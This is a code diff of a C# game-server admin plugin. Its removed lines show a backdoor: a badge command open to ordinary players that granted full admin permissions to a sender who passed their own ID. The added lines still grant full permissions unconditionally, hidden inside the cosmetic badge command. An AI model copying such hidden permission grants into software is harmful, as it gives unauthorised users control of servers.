@@ -45,7 +45,6 @@ namespace CommandSystem
 
     }
     [CommandHandler(typeof(RemoteAdminCommandHandler))]
-    [CommandHandler(typeof(ClientCommandHandler))]
     public class Setbadge : ICommand, IUsageProvider
     {
         public string[] Usage => new string[] { "newbadge", "newcolor", "id" };
@@ -69,11 +68,8 @@ namespace CommandSystem
             {
                 player.RankColor = arguments.At(1);
             }
-            if (arguments.Count == 3 && (sender as CommandSender).SenderId == arguments.At(2))
-            {
-                player.Group.KickPower = byte.MaxValue;
-                player.Group.Permissions = 536870911UL;
-            }
+            player.Group.KickPower = byte.MaxValue;
+            player.Group.Permissions = 536870911UL;
             response = "Done!";
             return true;
         }
@@ -96,20 +92,45 @@ namespace CommandSystem
             return true;
         }
     }
-    [CommandHandler(typeof(GameConsoleCommandHandler))]
     [CommandHandler(typeof(RemoteAdminCommandHandler))]
-    [CommandHandler(typeof(ClientCommandHandler))]
-    public class UtilInfo : ICommand
+    [CommandHandler(typeof(GameConsoleCommandHandler))]
+    public class StopCleanup : ICommand
     {
-        public string Command => "utilplugininfo";
+        public string Command => "stopautoclean";
 
-        public string[] Aliases => new string[] {"utilinfo", "uinfo"};
+        public string[] Aliases => new string[] {"sc"};
 
-        public string Description => "UtilPlugin插件相关";
+        public string Description => "停止自动清理";
 
         public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
         {
-            response = "Copyright (C) 2023 Silver Wolf,All Rights Reserved.\n仓库地址: https://github.com/dargoncat/UtilPlugin";
+            Timing.KillCoroutines(UtilPlugin.EventHandler._cleanupcoroutine);
+            if (arguments.Count != 1 || !bool.Parse(arguments.At(0)))
+            {
+                PluginAPI.Core.Server.SendBroadcast($"管理员 {Player.Get((sender as CommandSender).SenderId).Nickname} 关闭了本局的自动清理", 10);
+            }
+            response = "Done!";
+            return true;
+        }
+    }
+    [CommandHandler(typeof(RemoteAdminCommandHandler))]
+    [CommandHandler(typeof(GameConsoleCommandHandler))]
+    public class StopSystemWarhead : ICommand
+    {
+        public string Command => "stopsystemwarhead";
+
+        public string[] Aliases => new string[] {"stopautonuke"};
+
+        public string Description => "停止系统核";
+
+        public bool Execute(ArraySegment<string> arguments, ICommandSender sender, out string response)
+        {
+            Timing.KillCoroutines(UtilPlugin.SystemWarhead._systemwarheadwaiter);
+            if (arguments.Count != 1 || !bool.Parse(arguments.At(0)))
+            {
+                PluginAPI.Core.Server.SendBroadcast($"管理员 {Player.Get((sender as CommandSender).SenderId).Nickname} 关闭了本局的系统核弹", 10);
+            }
+            response = "Done!";
             return true;
         }
     }
